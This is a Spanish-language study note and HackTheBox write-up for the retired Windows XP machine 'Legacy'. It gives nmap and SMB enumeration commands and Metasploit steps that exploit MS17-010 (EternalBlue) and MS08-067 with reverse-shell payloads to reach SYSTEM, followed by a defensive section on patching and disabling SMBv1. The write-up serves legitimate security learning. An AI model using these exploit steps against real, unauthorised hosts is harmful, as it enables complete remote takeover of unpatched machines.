---
title: Legacy (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, windows, smb, eternalblue, ms17-010, ms08-067, rce, metasploit]
type: nota
status: en-progreso
source: claude-code
aliases: [Legacy HTB, HTB Legacy, EternalBlue lab, MS17-010 lab]
---

# Legacy — HackTheBox (Easy)

**SO:** Windows XP · **Dificultad:** Easy · **Skills:** Reconocimiento con Nmap, explotacion de SMB (MS17-010 / MS08-067), shell como SYSTEM sin escalada separada

Maquina clasica de HTB y referencia historica: un Windows XP expuesto en red con SMB sin parchear. El foothold y la escalada de privilegios son el mismo paso — el exploit entrega SYSTEM directamente. Ideal para entender por que EternalBlue sacudio al mundo en 2017.

> **Entorno legal:** HackTheBox es un laboratorio de ciberseguridad legal y autorizado. Nunca apliques estas tecnicas fuera de entornos con permiso expreso.

---

## Objetivo

Obtener ejecucion de codigo remota (RCE) preautenticada sobre SMB y leer las flags de usuario y administrador. No hay escalada de privilegios en fases separadas: el exploit otorga `NT AUTHORITY\SYSTEM` desde el primer momento.

---

## Acceso a la maquina (paso previo)

1. **Conectar la VPN de HTB** — descarga tu archivo `.ovpn` desde la web de HTB y ejecuta en una terminal dedicada:

```bash
sudo openvpn lab_<tu_usuario>.ovpn
```

Deja esa terminal abierta durante toda la sesion. Veras `Initialization Sequence Completed` cuando la conexion este lista.

2. **Lanzar la maquina** — en la web de HTB, busca "Legacy" en la seccion *Retired Machines* y pulsa *Spawn Machine*. El panel te asignara una IP del rango `10.10.10.x`.

> Las maquinas retiradas requieren suscripcion **VIP**. Las maquinas activas de la semana son gratuitas. Alternativa: usa el **Pwnbox** (Kali en el navegador dentro de HTB), que ya viene conectado a la VPN.

3. **Verificar conectividad:**

```bash
ping -c2 <IP>
```

4. A lo largo de este writeup, sustituye `<IP>` por la IP real que te haya asignado HTB (dinamica, cambia en cada spawn).

---

## Reconocimiento

**Categoria: escaneo de puertos y deteccion de version/scripts NSE**

Objetivo: identificar servicios expuestos y version exacta del SO antes de buscar vulnerabilidades.

```bash
nmap -sC -sV -oN nmap/legacy_initial.txt <IP>
```

Resultado esperado (orientativo — verifica contra la maquina en vivo):

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
|_smb-vuln-ms17-010: VULNERABLE
| smb-vuln-ms08-067:
|   VULNERABLE
```

Los scripts NSE `-sC` incluyen `smb-vuln-ms17-010` y `smb-vuln-ms08-067` por defecto en versiones modernas de Nmap. Si no aparecen, lanzalos de forma explicita:

```bash
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 <IP>
```

**Conclusion del reconocimiento:** Windows XP con SMB expuesto (139/445), sin firewall relevante, dos vulnerabilidades criticas confirmadas por Nmap.

---

## Enumeracion

**Categoria: identificacion de la superficie de ataque**

Con el SO confirmado como Windows XP y SMB sin parchear, la enumeracion adicional es minima — no hay HTTP, SSH ni otros servicios. El vector de ataque esta claro.

Puedes confirmar la version exacta de SMB y el nombre del host con:

```bash
smbclient -L //<IP> -N
```

O con `enum4linux` para un inventario mas completo de recursos compartidos y usuarios (aunque en este caso no aporta informacion critica para el ataque):

```bash
enum4linux -a <IP>
```

**Conclusion de enumeracion:** un solo vector viable — SMB vulnerable. Proceder directamente al foothold.

---

## Acceso inicial (foothold)

**Categoria: RCE preautenticado via SMB — MS17-010 (EternalBlue) o MS08-067**

En Legacy hay dos rutas estandar. Ambas entregan `NT AUTHORITY\SYSTEM` sin necesidad de escalada posterior.

### Via A — MS17-010 EternalBlue (CVE-2017-0144) con Metasploit

EternalBlue explota un desbordamiento de buffer en el protocolo SMBv1 al procesar transacciones especialmente construidas. El servidor ejecuta el shellcode enviado en el contexto de SYSTEM porque el servicio SMB corre con maximos privilegios.

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <tu_IP_VPN>   # la IP de tu interfaz tun0
set PAYLOAD windows/x64/shell/reverse_tcp
run
```

> **Nota:** Windows XP es x86, no x64. Si el payload x64 falla, prueba `windows/shell/reverse_tcp` (sin x64). Verifica el payload adecuado contra la maquina en vivo.

### Via B — MS08-067 (CVE-2008-4250) con Metasploit

MS08-067 es anterior (2008) y afecta al servicio Server de Windows al procesar rutas UNC malformadas en RPC. Tambien entrega SYSTEM directamente.

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
set LHOST <tu_IP_VPN>
set PAYLOAD windows/shell/reverse_tcp
run
```

### Via C — exploit manual (sin Metasploit)

Para practicar sin Metasploit, `searchsploit` indexa versiones publicas:

```bash
searchsploit ms17-010
searchsploit ms08-067
```

Los exploits de Exploit-DB para estas vulnerabilidades (p.ej. `42315.py` para MS17-010) requieren ajustar el shellcode y la direccion de retorno segun la version exacta del SO. El mecanismo es identico al de Metasploit: sobreescribir el buffer en el handler SMB e inyectar shellcode que abre una reverse shell.

**Resultado esperado tras cualquiera de las tres vias:**

```
C:\WINDOWS\system32> whoami
nt authority\system
```

---

## Escalada de privilegios

No aplica. El exploit SMB entrega `NT AUTHORITY\SYSTEM` (equivalente a root en Windows) directamente desde el foothold. Este es el patron tipico de vulnerabilidades en servicios que corren con privilegios de SYSTEM — no hay fase de escalada separada.

---

## Flags

Una vez dentro con SYSTEM, navega a las rutas estandar:

**Flag de usuario** — en el directorio home del usuario no-privilegiado:

```
C:\Documents and Settings\john\Desktop\user.txt
```

El nombre de usuario puede variar; explora `C:\Documents and Settings\` si difiere.

```
<flag>
```

**Flag de root/administrador:**

```
C:\Documents and Settings\Administrator\Desktop\root.txt
```

```
<flag>
```

---

## Patron y teoria

> Esta seccion es la mas importante. El objetivo es extraer el patron general para disenar sistemas mas seguros (perspectiva dev/purple team).

### Patron: RCE preautenticado en servicio de red con privilegios de SYSTEM

**Schema/categoria:** *Unauthenticated Remote Code Execution en servicio del sistema operativo con privilegios elevados.*

El patron tiene tres ingredientes:

1. **Servicio critico expuesto en red** — SMB (puerto 445) es accesible desde fuera sin autenticacion previa requerida para el vector de ataque.
2. **Vulnerabilidad de memoria sin parchear** — desbordamiento de buffer (MS08-067) o error en el procesamiento de transacciones SMBv1 (MS17-010) que permite sobreescribir el flujo de ejecucion e inyectar codigo arbitrario.
3. **Servicio corriendo como SYSTEM** — el proceso vulnerable tiene los maximos privilegios del SO, por lo que el shellcode hereda esos privilegios sin necesitar escalada.

**Por que es tan grave:** el atacante no necesita credenciales, ni interaccion del usuario, ni acceso previo. Un solo paquete de red malformado basta para comprometer completamente el sistema.

**Contexto historico:** MS08-067 fue el vector de Conficker (2008, millones de maquinas). MS17-010/EternalBlue fue filtrado de la NSA por Shadow Brokers en 2017 y es la base de WannaCry y NotPetya — dos de los ciberataques mas destructivos de la historia.

### Como se defiende / como se disena para evitarlo

| Capa | Medida | Razon |
|---|---|---|
| **Parches** | Aplicar actualizaciones de seguridad de forma sistematica y en tiempo | MS08-067 tenia parche en octubre 2008; MS17-010 en marzo 2017. Maquinas infectadas por WannaCry estaban sin parchear meses despues. |
| **Deshabilitar SMBv1** | `Set-SmbServerConfiguration -EnableSMB1Protocol $false` (PowerShell) | SMBv1 es un protocolo de 1996 sin cifrado ni autenticacion moderna. SMBv2/v3 no son vulnerables a estos exploits. |
| **Segmentacion de red** | No exponer el puerto 445 a Internet ni a segmentos no confiables | Un firewall perimetral bloquea el vector antes de que llegue al host. |
| **Principio de minimo privilegio para servicios** | Si un servicio no necesita SYSTEM, no debe correr como SYSTEM | Reduce el impacto si el servicio es comprometido. |
| **EDR / deteccion de anomalias SMB** | Alertas sobre transacciones SMB malformadas o shellcode en memoria | Capa de deteccion cuando la prevencion falla. |

**Para el desarrollador/arquitecto:** si tu aplicacion necesita compartir archivos en red interna, usa SMBv3 con cifrado habilitado, restringe el acceso por IP y usuario, y jamas expongas SMB a Internet. Si usas Windows Server moderno, SMBv1 viene deshabilitado por defecto desde Windows Server 2016 — no lo reactives.

**Para el purple team:** EternalBlue es una firma bien conocida en cualquier EDR moderno. Si un ejercicio de red team lo detecta, el objetivo es validar la cadena de alertas (SIEM -> SOC -> respuesta), no solo la tecnica en si.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Starting_Point/00_README]]
- [[08-vulnerabilidades-y-explotacion]]
